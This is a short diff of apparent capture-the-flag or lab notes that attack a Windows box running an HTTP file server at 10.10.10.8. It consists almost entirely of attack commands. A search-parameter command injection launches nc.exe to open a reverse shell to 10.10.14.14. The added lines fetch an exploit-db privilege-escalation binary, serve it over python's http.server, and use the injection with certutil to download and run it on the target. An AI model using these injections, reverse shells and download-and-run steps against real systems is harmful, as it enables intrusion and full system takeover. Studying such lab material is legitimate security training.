@@ -7,10 +7,13 @@ http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+nc.exe+10.10.14.14+4567+-e+cmd.}
 
 #use + to replace spaces
 
-https://github.com/khr0x40sh/ms16-032/blob/master/x64/ms16-032.exe
+wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
 
 python3 -m http.server
-ms16-032.exe
+
+http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+certutil+-urlcache+-f+http://10.10.14.14:8000/41020.exe+41020.exe.}
+
+41020.exe
 
 
 ```
